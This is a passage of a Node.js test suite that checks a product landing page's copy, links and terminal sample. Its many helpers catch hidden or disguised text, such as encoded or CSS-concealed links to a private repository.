import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from '/home/valentin/.dev-browser/node_modules/playwright/index.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');

function newestChrome() {
  const base = '/home/valentin/.cache/ms-playwright';
  const versions = fs.readdirSync(base)
    .filter((name) => name.startsWith('chromium-'))
    .map((name) => ({ name, n: Number(name.split('-')[1]) }))
    .filter((item) => Number.isFinite(item.n))
    .sort((a, b) => b.n - a.n);
  assert.ok(versions.length > 0, 'playwright chromium is installed');
  return path.join(base, versions[0].name, 'chrome-linux64/chrome');
}

function contentType(filePath) {
  if (filePath.endsWith('.html')) return 'text/html; charset=utf-8';
  if (filePath.endsWith('.js')) return 'text/javascript; charset=utf-8';
  if (filePath.endsWith('.css')) return 'text/css; charset=utf-8';
  if (filePath.endsWith('.png')) return 'image/png';
  return 'application/octet-stream';
}

function listen() {
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    const rel = decodeURIComponent(url.pathname === '/' ? '/index.html' : url.pathname);
    const filePath = path.join(root, rel);
    if (!filePath.startsWith(root)) {
      res.writeHead(403);
      res.end('forbidden');
      return;
    }
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('not found');
        return;
      }
      res.writeHead(200, { 'content-type': contentType(filePath) });
      res.end(data);
    });
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve(server));
  });
}

function rgb(value) {
  return value.match(/\d+(\.\d+)?/g).slice(0, 3).map(Number);
}

function distance(a, b) {
  const dx = a[0] - b[0];
  const dy = a[1] - b[1];
  const dz = a[2] - b[2];
  return Math.hypot(dx, dy, dz);
}

function channel(value) {
  const c = value / 255;
  return c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
}

function contrastRatio(a, b) {
  const lum = (rgbValue) => 0.2126 * channel(rgbValue[0]) + 0.7152 * channel(rgbValue[1]) + 0.0722 * channel(rgbValue[2]);
  const [hi, lo] = lum(a) > lum(b) ? [lum(a), lum(b)] : [lum(b), lum(a)];
  return (hi + 0.05) / (lo + 0.05);
}

function primaryLinks(source) {
  const links = [];
  for (const match of source.matchAll(/<a\b([^>]*)>([\s\S]*?)<\/a>/g)) {
    const attrs = match[1];
    const classAttr = attrs.match(/\bclass="([^"]*)"/);
    if (!classAttr || !classAttr[1].split(/\s+/).includes('btn-primary')) continue;
    const hrefAttr = attrs.match(/\bhref="([^"]*)"/);
    const text = match[2].replace(/<[^>]+>/g, '').replace(/\s+/g, ' ').trim();
    links.push({ href: hrefAttr ? hrefAttr[1] : '', text });
  }
  return links;
}

function asksForOpenRouterKey(source) {
  if (/openrouter[\s_-]*api[\s_-]*keys?\b/i.test(source)) return true;
  if (/openrouter[\s_-]*keys?\b/i.test(source)) return true;
  const span = 200;
  if (new RegExp(`openrouter[\\s\\S]{0,${span}}\\bkeys?\\b`, 'i').test(source)) return true;
  if (new RegExp(`\\bkeys?\\b[\\s\\S]{0,${span}}openrouter`, 'i').test(source)) return true;
  return false;
}

function assertNoOpenRouterKey(source) {
  if (asksForOpenRouterKey(source)) assert.fail('page asks for an OpenRouter key');
}

const SDK_SENTENCE = 'This page runs the Endless Testing SDK.';
const HOME_SENTENCE = 'The homepage is round endlesstesting-100.';
const SITE_SENTENCE = 'valentinyeo.com is round valentinyeo-2.';
const RUNNING_SENTENCE = 'Both rounds are still running.';
const NO_WINNER_SENTENCE = 'No winner has been called.';

function noteClaimsWinner(note) {
  const rest = note.replace(/\bno winner has been called\b/gi, ' ');
  return /\bwinners?\b|\bwinning\b|\bwins?\b|\bwon\b/i.test(rest);
}

function noteNamesWinningLine(note) {
  const rest = note.replace(/\bno winner has been called\b/gi, ' ');
  return /\b(?:beat|beats|beaten)\b/i.test(rest);
}

function noteDeniesRunning(note) {
  let from = 0;
  while (from < note.length) {
    const idx = note.indexOf(RUNNING_SENTENCE, from);
    if (idx < 0) break;
    const prefix = note.slice(0, idx);
    if (/\b(?:not|no|never)\s+$/i.test(prefix)) return true;
    from = idx + RUNNING_SENTENCE.length;
  }
  const rest = note.split(RUNNING_SENTENCE).join(' ');
  if (/\brunning\b/i.test(rest)) return true;
  if (/\b(?:stopped|finished|ended|completed)\b/i.test(rest)) return true;
  if (/\bno longer\b/i.test(rest)) return true;
  if (/\bneither\b/i.test(rest)) return true;
  if (/\bnot\b(?:\s+\w+){0,6}\s+collecting\b/i.test(rest)) return true;
  return false;
}

function noteGivesLift(note) {
  if (/\b(?:up)?lifts?\b/i.test(note)) return true;
  if (/\bpercent(?:age)?s?\b|\bper\s+cents?\b/i.test(note)) return true;
  if (/\d+(?:\.\d+)?\s*(?:%|％|٪)/.test(note)) return true;
  if (/\d+(?:\.\d+)?\s*x\b/i.test(note)) return true;
  return false;
}

function cssDeclConceals(body) {
  return concealedAttrs(`style="${body.replaceAll('"', "'")}"`);
}

function elementFrom(tag, attrs) {
  const classAttr = attrs.match(/\bclass\s*=\s*["']([^"']*)["']/i);
  const idAttr = attrs.match(/\bid\s*=\s*["']([^"']*)["']/i);
  return {
    tag: tag.toLowerCase(),
    id: idAttr ? idAttr[1].toLowerCase() : '',
    classes: new Set(classAttr ? classAttr[1].toLowerCase().split(/\s+/).filter(Boolean) : []),
  };
}

function elementMatches(el, compound) {
  const text = compound.trim().toLowerCase();
  if (!text || /[:[*]/.test(text)) return false;
  let tag = '';
  let id = '';
  const classes = [];
  for (let i = 0; i < text.length;) {
    if (text[i] === '#') {
      const name = /^[\w-]+/.exec(text.slice(i + 1));
      if (!name || id) return false;
      id = name[0];
      i += name[0].length + 1;
    } else if (text[i] === '.') {
      const name = /^[\w-]+/.exec(text.slice(i + 1));
      if (!name) return false;
      classes.push(name[0]);
      i += name[0].length + 1;
    } else if (/[a-z]/i.test(text[i])) {
      const name = /^[a-z][\w-]*/i.exec(text.slice(i));
      if (!name || tag) return false;
      tag = name[0].toLowerCase();
      i += name[0].length;
    } else return false;
  }
  if (tag && tag !== el.tag) return false;
  if (id && id !== el.id) return false;
  if (!tag && !id && classes.length === 0) return false;
  return classes.every((name) => el.classes.has(name));
}

function parseSimpleSelector(selector) {
  const src = selector.trim().toLowerCase();
  if (!src || src.startsWith('@')) return null;
  const items = [];
  let buf = '';
  const flush = () => {
    if (!buf.trim()) return false;
    items.push({ kind: 'sel', value: buf.trim() });
    buf = '';
    return true;
  };
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (ch === '>') {
      if (!flush()) return null;
      items.push({ kind: 'child' });
      while (src[i + 1] === ' ') i++;
    } else if (/\s/.test(ch)) {
      if (!flush()) return null;
      items.push({ kind: 'desc' });
      while (i + 1 < src.length && /\s/.test(src[i + 1])) i++;
    } else buf += ch;
  }
  if (!flush()) return null;
  return items;
}

function selectorMatches(items, chain, start) {
  let item = items.length - 1;
  let at = start;
  if (!items[item] || items[item].kind !== 'sel') return false;
  if (!elementMatches(chain[at], items[item].value)) return false;
  item--;
  while (item >= 0) {
    const comb = items[item];
    if (!comb || comb.kind === 'sel') return false;
    item--;
    const next = items[item];
    if (!next || next.kind !== 'sel') return false;
    if (comb.kind === 'child') {
      at += 1;
      if (at >= chain.length || !elementMatches(chain[at], next.value)) return false;
    } else {
      let found = false;
      for (let cursor = at + 1; cursor < chain.length; cursor++) {
        if (elementMatches(chain[cursor], next.value)) {
          at = cursor;
          found = true;
          break;
        }
      }
      if (!found) return false;
    }
    item--;
  }
  return true;
}

function pageCss(source) {
  return [...source.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/gi)]
    .map((match) => match[1])
    .join('\n')
    .replace(/\/\*[\s\S]*?\*\//g, '');
}

function concealingRules(css) {
  const rules = [];
  const re = /([^{}]+)\{([^{}]*)\}/g;
  let match;
  while ((match = re.exec(css))) {
    if (!cssDeclConceals(match[2])) continue;
    for (const part of match[1].split(',')) {
      const items = parseSimpleSelector(part);
      if (items) rules.push(items);
    }
  }
  return rules;
}

function chainIsHidden(rules, chain) {
  return rules.some((items) => chain.some((_, start) => selectorMatches(items, chain, start)));
}

const VOID_TAGS = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'source', 'track', 'wbr']);
const HIDDEN_TEXT_TAGS = new Set(['script', 'style', 'template', 'noscript']);
const RAW_SECTION_TAGS = new Set(['script', 'style', 'template', 'noscript', 'textarea']);
const BLOCK_TAGS = new Set(['address', 'article', 'aside', 'blockquote', 'dd', 'div', 'dl', 'dt', 'figcaption', 'figure', 'footer', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header', 'li', 'main', 'nav', 'ol', 'p', 'pre', 'section', 'table', 'tr', 'ul']);

function dogfoodElements(source) {
  const clean = source
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '');
  const re = /<(\/?)([a-zA-Z][\w:-]*)\b([^>]*)>/g;
  const stack = [];
  const notes = [];
  let noteStart = -1;
  let noteDepth = 0;
  let noteAttrs = '';
  let noteChain = null;
  let match;
  while ((match = re.exec(clean))) {
    const closing = match[1] === '/';
    const tag = match[2].toLowerCase();
    const attrs = match[3];
    if (closing) {
      if (noteStart >= 0 && tag === 'p') {
        if (noteDepth === 0) {
          notes.push({ attrs: noteAttrs, chain: noteChain, inner: clean.slice(noteStart, match.index) });
          noteStart = -1;
        } else noteDepth--;
      }
      for (let i = stack.length - 1; i >= 0; i--) {
        if (stack[i].tag === tag) {
          stack.length = i;
          break;
        }
      }
      continue;
    }
    const el = elementFrom(tag, attrs);
    if (tag === 'p' && el.id === 'dogfood-note' && noteStart < 0) {
      noteAttrs = attrs;
      noteChain = [el, ...stack.slice().reverse()];
      noteStart = re.lastIndex;
      noteDepth = 0;
    } else if (noteStart >= 0 && tag === 'p') noteDepth++;
    if (!VOID_TAGS.has(tag) && !match[0].endsWith('/>')) stack.push(el);
  }
  return notes;
}

function hasBounded(text, sentence) {
  let from = 0;
  while (from < text.length) {
    const idx = text.indexOf(sentence, from);
    if (idx < 0) return false;
    const before = idx > 0 ? text[idx - 1] : '';
    const after = text[idx + sentence.length] || '';
    const beforeOk = before === '' || !/[A-Za-z0-9-]/.test(before);
    const afterOk = after === '' || !/[A-Za-z0-9-]/.test(after);
    if (beforeOk && afterOk) return true;
    from = idx + sentence.length;
  }
  return false;
}

function hasSlug(text, slug) {
  return new RegExp(`(?<![A-Za-z0-9-])${slug}(?![A-Za-z0-9-])`).test(text);
}

function dogfoodNoteText(source) {
  const uncommented = source.replace(/<!--[\s\S]*?-->/g, '');
  const rules = concealingRules(pageCss(uncommented));
  const notes = dogfoodElements(source);
  if (notes.length !== 1) assert.fail('dogfood note missing');
  const note = notes[0];
  if (concealedAttrs(note.attrs) || chainIsHidden(rules, note.chain)) assert.fail('dogfood note missing');
  const visible = stripConcealed(note.inner, (tag, attrs) => {
    const chain = [elementFrom(tag, attrs), ...note.chain];
    return chainIsHidden(rules, chain);
  })
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<template\b[^>]*>[\s\S]*?<\/template>/gi, '');
  return normalizePage(visible.replace(/<br\b[^>]*>/gi, ' ').replace(/<[^>]+>/g, '')).replace(/\s+/g, ' ').trim();
}

function assertDogfoodRounds(source) {
  const note = dogfoodNoteText(source);
  if (!hasBounded(note, SDK_SENTENCE)) assert.fail('dogfood note dropped the SDK line');
  if (!hasSlug(note, 'endlesstesting-100')) assert.fail('dogfood note missing round endlesstesting-100');
  if (!hasSlug(note, 'valentinyeo-2')) assert.fail('dogfood note missing round valentinyeo-2');
  if (!hasBounded(note, HOME_SENTENCE)) assert.fail('dogfood note does not name the homepage round');
  if (!hasBounded(note, SITE_SENTENCE)) assert.fail('dogfood note does not name the valentinyeo.com round');
  if (!hasBounded(note, RUNNING_SENTENCE)) assert.fail('dogfood note missing still running');
  if (!hasBounded(note, NO_WINNER_SENTENCE)) assert.fail('dogfood note does not say no winner has been called');
  if (noteDeniesRunning(note)) assert.fail('dogfood note says a round is not still running');
  if (noteClaimsWinner(note)) assert.fail('dogfood note claims a winner');
  if (noteNamesWinningLine(note)) assert.fail('dogfood note names a winning line');
  if (noteGivesLift(note)) assert.fail('dogfood note gives a lift');
}

function terminalRegion(source) {
  const openRe = /<div\b([^>]*)>/gi;
  let open;
  while ((open = openRe.exec(source))) {
    if (elementFrom('div', open[1]).id !== 'terminal') continue;
    const start = open.index + open[0].length;
    let depth = 1;
    const tagRe = /<!--[\s\S]*?-->|<\/?div\b[^>]*>/gi;
    tagRe.lastIndex = start;
    let match;
    while ((match = tagRe.exec(source))) {
      if (match[0].startsWith('<!--')) continue;
      depth += match[0].startsWith('</') ? -1 : 1;
      if (depth === 0) return { attrs: open[1], inner: source.slice(start, match.index) };
    }
    return null;
  }
  return null;
}

function assertStatusContinues(source) {
  const region = terminalRegion(source);
  assert.ok(region, 'terminal sample missing');
  if (containsNeedle(region.inner, 'winner: Clear price')) {
    assert.fail('winner: Clear price is in the terminal');
  }
  const rules = concealingRules(pageCss(source.replace(/<!--[\s\S]*?-->/g, '')));
  const terminalEl = elementFrom('div', region.attrs);
  if (concealedAttrs(region.attrs) || chainIsHidden(rules, [terminalEl])) {
    assert.fail('decision: continue missing from terminal');
  }
  const visible = stripConcealed(
    region.inner
      .replace(/<!--[\s\S]*?-->/g, '')
      .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
      .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
      .replace(/<template\b[^>]*>[\s\S]*?<\/template>/gi, '')
      .replace(/<noscript\b[^>]*>[\s\S]*?<\/noscript>/gi, ''),
    (tag, attrs) => chainIsHidden(rules, [elementFrom(tag, attrs), terminalEl]),
  )
    .replace(/<br\b[^>]*>/gi, '\n')
    .replace(/<[^>]+>/g, '');
  const text = normalizePage(visible);
  const marker = '$ et status';
  const at = text.indexOf(marker);
  const after = at < 0 ? '' : text.slice(at + marker.length);
  const newline = after.indexOf('\n');
  const rest = newline < 0 ? '' : after.slice(newline + 1);
  const lines = rest.split('\n').map((item) => item.trim());
  if (!lines.includes('decision: continue')) {
    assert.fail('decision: continue missing from terminal');
  }
}

const ALLOWED_LOGIN_LINES = new Set(['et login --email', 'et login --code']);

function terminalBgPaint(body) {
  return /(?<![\w-])color\s*:\s*(?:var\(\s*--code\s*\)|#(?:121612|1a211c))(?![-\w])/i.test(body);
}

function terminalPaintedAway(attrs) {
  const style = attrs.match(/\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
  const value = style ? (style[1] ?? style[2] ?? style[3] ?? '') : '';
  return terminalBgPaint(value);
}

function terminalHideRules(css) {
  const rules = [];
  const re = /([^{}]+)\{([^{}]*)\}/g;
  let match;
  while ((match = re.exec(css))) {
    if (!cssDeclConceals(match[2]) && !terminalBgPaint(match[2])) continue;
    for (const part of match[1].split(',')) {
      const items = parseSimpleSelector(part);
      if (items) rules.push(items);
    }
  }
  return rules;
}

function trimAscii(value) {
  return value.replace(/^[ \t\r\n]+|[ \t\r\n]+$/g, '');
}

function assertLoginText(text) {
  const login = [];
  for (const line of text.split('\n')) {
    const body = trimAscii(line).replace(/^\$[ \t]*/, '');
    if (!body) continue;
    const folded = body
      .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
      .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '')
      .replace(/\s+/g, ' ')
      .trim();
    if (/^et login\b/i.test(folded)) login.push(body);
  }
  if (login.length === 0) assert.fail('terminal login line missing');
  for (const line of login) {
    if (!ALLOWED_LOGIN_LINES.has(line)) assert.fail('terminal login line needs --email or --code');
  }
}

function terminalVisibleText(fragment, ancestors, rules) {
  const clean = fragment.replace(/<!--[\s\S]*?-->/g, '');
  const re = /<(\/?)([a-zA-Z][\w:-]*)\b([^>]*)>|([^<]+)/g;
  const stack = [];
  const hiddenDepth = [];
  let out = '';
  let match;
  while ((match = re.exec(clean))) {
    if (match[4] !== undefined) {
      if (hiddenDepth.length === 0) out += match[4];
      continue;
    }
    const closing = match[1] === '/';
    const tag = match[2].toLowerCase();
    const attrs = match[3] || '';
    if (!closing && RAW_SECTION_TAGS.has(tag)) {
      const end = clean.slice(re.lastIndex).search(new RegExp(`</${tag}\\s*>`, 'i'));
      if (end < 0) break;
      const gt = clean.indexOf('>', re.lastIndex + end);
      re.lastIndex = gt < 0 ? clean.length : gt + 1;
      continue;
    }
    if (closing) {
      for (let i = stack.length - 1; i >= 0; i--) {
        if (stack[i].tag === tag) {
          stack.length = i;
          break;
        }
      }
      while (hiddenDepth.length && hiddenDepth[hiddenDepth.length - 1] > stack.length) hiddenDepth.pop();
      continue;
    }
    if (tag === 'br') {
      if (hiddenDepth.length === 0) out += '\n';
      continue;
    }
    const el = elementFrom(tag, attrs);
    const chain = [el, ...stack.slice().reverse(), ...ancestors];
    const hide = concealedAttrs(attrs) || terminalPaintedAway(attrs) || chainIsHidden(rules, chain) || HIDDEN_TEXT_TAGS.has(tag);
    if (VOID_TAGS.has(tag) || /\/\s*>$/.test(match[0])) continue;
    stack.push(el);
    if (hide || hiddenDepth.length > 0) hiddenDepth.push(stack.length);
  }
  return out;
}

function assertTerminalLogin(source) {
  const region = terminalRegion(source);
  assert.ok(region, 'terminal sample missing');
  const rules = terminalHideRules(pageCss(source.replace(/<!--[\s\S]*?-->/g, '')));
  const terminalEl = elementFrom('div', region.attrs);
  if (concealedAttrs(region.attrs) || terminalPaintedAway(region.attrs) || chainIsHidden(rules, [terminalEl])) {
    assert.fail('terminal login line missing');
  }
  assertLoginText(decodeEntities(terminalVisibleText(region.inner, [terminalEl], rules)));
}

const STILL_RUNNING_SENTENCE = 'A round that is still running prints decision: continue and does not name a winner.';

function claimsLiveRoundWinner(text) {
  const rest = text.split(STILL_RUNNING_SENTENCE).join(' ');
  const subject = '(?:the\\s+)?(?:homepage(?:\\s+round)?|endlesstesting-100|valentinyeo\\.com|valentinyeo-2)';
  const patterns = [
    new RegExp(`${subject}\\s+(?:has|have|got|gets)\\s+(?:a|the|its)\\s+winner`, 'i'),
    new RegExp(`${subject}\\s+is\\s+(?:a\\s+|the\\s+)?winner`, 'i'),
    new RegExp(`winner\\s+is\\s+${subject}`, 'i'),
    new RegExp(`winner\\s+(?:of|for)\\s+${subject}`, 'i'),
    new RegExp(`(?:called|named|picked|declared)\\s+(?:a\\s+|the\\s+)?winner\\s+(?:for|on)\\s+${subject}`, 'i'),
    new RegExp(`${subject}'s\\s+winner`, 'i'),
  ];
  return patterns.some((pattern) => pattern.test(rest));
}

function heroInner(source) {
  const uncommented = source.replace(/<!--[\s\S]*?-->/g, '');
  const re = /<(\/?)([a-zA-Z][\w:-]*)\b([^>]*)>/g;
  let match;
  let depth = 0;
  let start = -1;
  let heroAttrs = '';
  while ((match = re.exec(uncommented))) {
    const closing = match[1] === '/';
    const tag = match[2].toLowerCase();
    const attrs = match[3] || '';
    if (!closing && RAW_SECTION_TAGS.has(tag)) {
      const end = uncommented.slice(re.lastIndex).search(new RegExp(`</${tag}\\s*>`, 'i'));
      if (end < 0) return null;
      const gt = uncommented.indexOf('>', re.lastIndex + end);
      re.lastIndex = gt < 0 ? uncommented.length : gt + 1;
      continue;
    }
    if (tag !== 'section') continue;
    if (!closing) {
      const el = elementFrom(tag, attrs);
      if (depth === 0 && el.classes.has('hero')) {
        start = re.lastIndex;
        heroAttrs = attrs;
        depth = 1;
      } else if (depth > 0) depth += 1;
    } else if (depth > 0) {
      depth -= 1;
      if (depth === 0) return { attrs: heroAttrs, inner: uncommented.slice(start, match.index) };
    }
  }
  return null;
}

function heroVisibleText(source) {
  const hero = heroInner(source);
  if (!hero) return '';
  const rules = concealingRules(pageCss(source.replace(/<!--[\s\S]*?-->/g, '')));
  const heroEl = elementFrom('section', hero.attrs);
  if (concealedAttrs(hero.attrs) || chainIsHidden(rules, [heroEl])) return '';
  return collectVisible(hero.inner, [heroEl], rules);
}

function collectVisible(fragment, ancestors, rules) {
  const re = /<(\/?)([a-zA-Z][\w:-]*)\b([^>]*)>|([^<]+)/g;
  const stack = [];
  const hiddenDepth = [];
  let out = '';
  let match;
  while ((match = re.exec(fragment))) {
    if (match[4] !== undefined) {
      if (hiddenDepth.length === 0) out += match[4];
      continue;
    }
    const closing = match[1] === '/';
    const tag = match[2].toLowerCase();
    const attrs = match[3] || '';
    if (closing) {
      const visibleBlock = BLOCK_TAGS.has(tag) && hiddenDepth.length === 0;
      for (let i = stack.length - 1; i >= 0; i--) {
        if (stack[i].tag === tag) {
          stack.length = i;
          break;
        }
      }
      while (hiddenDepth.length && hiddenDepth[hiddenDepth.length - 1] > stack.length) hiddenDepth.pop();
      if (visibleBlock) out += ' ';
      continue;
    }
    const el = elementFrom(tag, attrs);
    const chain = [el, ...stack.slice().reverse(), ...ancestors];
    const hide = concealedAttrs(attrs) || chainIsHidden(rules, chain) || HIDDEN_TEXT_TAGS.has(tag);
    if (BLOCK_TAGS.has(tag) && !hide && hiddenDepth.length === 0) out += ' ';
    if (tag === 'br') {
      if (!hide && hiddenDepth.length === 0) out += ' ';
      continue;
    }
    if (VOID_TAGS.has(tag) || /\/\s*>$/.test(match[0])) continue;
    stack.push(el);
    if (hide || hiddenDepth.length > 0) hiddenDepth.push(stack.length);
  }
  return normalizePage(out).replace(/\s+/g, ' ').trim();
}

function assertStillRunningSentence(source) {
  assertStatusContinues(source);
  const text = heroVisibleText(source);
  if (!hasBounded(text, STILL_RUNNING_SENTENCE)) assert.fail('still-running sentence missing');
  if (claimsLiveRoundWinner(text)) assert.fail('still-running sentence claims a live round winner');
}

function assertLinesSection(source) {
  const lines = source.match(/<section id="lines">([\s\S]*?)<\/section>/);
  assert.ok(lines, 'lines section missing');
  assert.match(lines[1], /<h2>The product writes the challenger lines<\/h2>/);
  assert.match(lines[1], /You connect Claude, Codex, or ChatGPT\./);
  assert.match(lines[1], /Endless Testing writes the next lines\./);
  const connect = source.match(/<section id="connect">([\s\S]*?)<\/section>/);
  assert.ok(connect, 'connect section missing');
  assert.match(connect[1], /<h3>API<\/h3>/);
}

function assertPrimaryTrialGoal(source) {
  const links = primaryLinks(source);
  assert.ok(links.length > 0, 'index has no primary links');
  for (const link of links) {
    assert.equal(link.href, 'https://dash.endlesstesting.ai/');
    if (link.text === 'Start 7-day trial') {
      assert.fail('primary link still uses the shorter trial label');
    }
    assert.equal(link.text, 'Start 7-day free trial');
  }
}

test('primary links use Start 7-day free trial and reject the shorter label', () => {
  assertPrimaryTrialGoal(html);
  const shorter = '<a class="btn btn-primary" href="https://dash.endlesstesting.ai/">Start 7-day trial</a>';
  assert.throws(() => assertPrimaryTrialGoal(shorter), /shorter trial label/);
  const longer = '<a class="btn btn-primary" href="https://dash.endlesstesting.ai/">Start 7-day free trial</a>';
  assertPrimaryTrialGoal(longer);
  const reverted = html.replaceAll('Start 7-day free trial', 'Start 7-day trial');
  assert.notEqual(reverted, html);
  assert.throws(() => assertPrimaryTrialGoal(reverted), /shorter trial label/);
});

const INSTALL_DOCS = 'https://docs.endlesstesting.ai/getting-started/install/';
const PRIVATE_REPO = 'github.com/valentinyeo/endless-testing';

function percentDecoded(source) {
  let cur = decodeEntities(source);
  for (let pass = 0; pass < 3; pass++) {
    const next = cur.replace(/%[0-9a-f]{2}/gi, (hex) => {
      try {
        return decodeURIComponent(hex);
      } catch {
        return hex;
      }
    });
    if (next === cur) return cur;
    cur = next;
  }
  return cur;
}

function pageLinksPrivateRepo(source) {
  if (containsNeedle(source, PRIVATE_REPO)) return true;
  if (containsNeedle(percentDecoded(source), PRIVATE_REPO)) return true;
  const glued = normalizePage(percentDecoded(source))
    .toLowerCase()
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<[^>]+>/g, '');
  return glued.includes(PRIVATE_REPO);
}

function hrefOf(attrs) {
  const match = attrs.match(/\bhref\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
  if (!match) return '';
  return match[1] ?? match[2] ?? match[3] ?? '';
}

function anchorText(inner) {
  return normalizePage(stripConcealed(inner).replace(/<[^>]+>/g, '')).replace(/\s+/g, ' ').trim();
}

function elementSlice(source, openRe, tagName) {
  const clean = source.replace(/<!--[\s\S]*?-->/g, '');
  const open = new RegExp(openRe.source, openRe.flags.replace('g', '')).exec(clean);
  if (!open) return null;
  const tagRe = new RegExp(`</?${tagName}\\b[^>]*>`, 'gi');
  tagRe.lastIndex = open.index + open[0].length;
  let depth = 1;
  let match;
  while ((match = tagRe.exec(clean))) {
    depth += match[0].startsWith('</') ? -1 : 1;
    if (depth === 0) {
      return { open: open[0], inner: clean.slice(open.index + open[0].length, match.index) };
    }
  }
  return null;
}

function containerConcealed(openTag, allowHidden) {
  const attrs = openTag.replace(/^<\w+\b/i, '').replace(/>$/, '');
  const rest = allowHidden ? attrs.replace(/(^|\s)hidden(?=\s|=|$)/gi, '$1') : attrs;
  return concealedAttrs(rest);
}

function assertInstallLinkIn(source, openRe, tagName, allowHidden) {
  const slice = elementSlice(source, openRe, tagName);
  if (!slice || containerConcealed(slice.open, allowHidden)) assert.fail('install doc links missing');
  const visible = stripConcealed(slice.inner);
  const links = [];
  for (const match of visible.matchAll(/<a\b([^>]*)>([\s\S]*?)<\/a>/gi)) {
    if (concealedAttrs(match[1])) continue;
    const href = hrefOf(match[1]);
    const text = anchorText(match[2]);
    if (href === INSTALL_DOCS || text === 'Install et') links.push({ href, text });
  }
  if (links.length !== 1) assert.fail('install doc links missing');
  if (links[0].href !== INSTALL_DOCS) assert.fail('install doc href wrong');
  if (links[0].text !== 'Install et') assert.fail('install doc label wrong');
}

function assertInstallDocLinks(source) {
  if (pageLinksPrivateRepo(source)) assert.fail('page links the private GitHub repo');
  assertInstallLinkIn(source, /<nav\b[^>]*\bclass\s*=\s*"[^"]*\bnav-links\b[^"]*"[^>]*>/i, 'nav', false);
  assertInstallLinkIn(source, /<div\b[^>]*\bid\s*=\s*"nav-panel"[^>]*>/i, 'div', true);
  assertInstallLinkIn(source, /<article\b[^>]*\bclass\s*=\s*"[^"]*\boss\b[^"]*"[^>]*>/i, 'article', false);
}

test('install links point at the install docs and the private repo is gone', () => {
  assertInstallDocLinks(html);
  const leaked = html.replaceAll(INSTALL_DOCS, 'https://github.com/valentinyeo/endless-testing');
  assert.notEqual(leaked, html);
  assert.throws(() => assertInstallDocLinks(leaked), /private GitHub repo/);
  const relabeled = html.replaceAll('>Install et<', '>GitHub<');
  assert.notEqual(relabeled, html);
  assert.throws(() => assertInstallDocLinks(relabeled), /install doc label wrong/);
  const dropped = html.replace(
    `<a href="${INSTALL_DOCS}">Install et</a>`,
    '<a href="https://docs.endlesstesting.ai">Docs</a>',
  );
  assert.notEqual(dropped, html);
  assert.throws(() => assertInstallDocLinks(dropped), /install doc links missing/);

  const disguises = [
    ['entity hyphen', `${html}\n<a href="https://github.com/valentinyeo/endless&#45;testing">GitHub</a>`],
    ['hex hyphen', `${html}\n<a href="https://github.com/valentinyeo/endless&#x2d;testing">GitHub</a>`],
    ['named slash', `${html}\ngithub.com&sol;valentinyeo&sol;endless-testing`],
    ['double encoded slash', `${html}\ngithub.com&amp;sol;valentinyeo&amp;sol;endless-testing`],
    ['upper host', `${html}\nhttps://GitHub.com/valentinyeo/endless-testing`],
    ['zero width', `${html}\ngithub.com/valentinyeo/endless-\u200btesting`],
    ['percent hyphen', `${html}\nhttps://github.com/valentinyeo/endless%2Dtesting`],
    ['split tags', `${html}\n<p>github.com/<span>valentinyeo/endless-testing</span></p>`],
  ];
  for (const [name, sample] of disguises) {
    assert.notEqual(sample, html, name);
    assert.throws(() => assertInstallDocLinks(sample), /private GitHub repo/, name);
  }

  const commented = html
    .replaceAll(
      `<a href="${INSTALL_DOCS}">Install et</a>`,
      `<!-- <a href="${INSTALL_DOCS}">Install et</a> -->`,
    )
    .replace(
      `<a class="btn btn-quiet" href="${INSTALL_DOCS}">Install et</a>`,
      `<!-- <a class="btn btn-quiet" href="${INSTALL_DOCS}">Install et</a> -->`,
    );
  assert.notEqual(commented, html);
  assert.throws(() => assertInstallDocLinks(commented), /install doc links missing/);

  const hiddenNav = html.replace(
    `<a href="${INSTALL_DOCS}">Install et</a>`,
    `<a href="${INSTALL_DOCS}" hidden>Install et</a>`,
  );
  assert.notEqual(hiddenNav, html);
  assert.throws(() => assertInstallDocLinks(hiddenNav), /install doc links missing/);

  const hiddenOss = html.replace(
    `<a class="btn btn-quiet" href="${INSTALL_DOCS}">Install et</a>`,
    `<a class="btn btn-quiet" href="${INSTALL_DOCS}" style="display:none">Install et</a>`,
  );
  assert.notEqual(hiddenOss, html);
  assert.throws(() => assertInstallDocLinks(hiddenOss), /install doc links missing/);

  const wrapped = html.replace(
    `<a href="${INSTALL_DOCS}">Install et</a>`,
    `<span style="display:none"><a href="${INSTALL_DOCS}">Install et</a></span>`,
  );
  assert.notEqual(wrapped, html);
  assert.throws(() => assertInstallDocLinks(wrapped), /install doc links missing/);
});

const INSTALL_FILES = [
  'et-x86_64-linux-musl',
  'et-aarch64-linux-musl',
  'et-x86_64-macos',
  'et-aarch64-macos',
  'et-x86_64-windows',
];

function asksForGitHubLogin(source) {
  if (/gh\s+auth\s+login/i.test(source)) return true;
  if (/\bGITHUB_TOKEN\b/.test(source)) return true;
  if (/\bGH_TOKEN\b/.test(source)) return true;
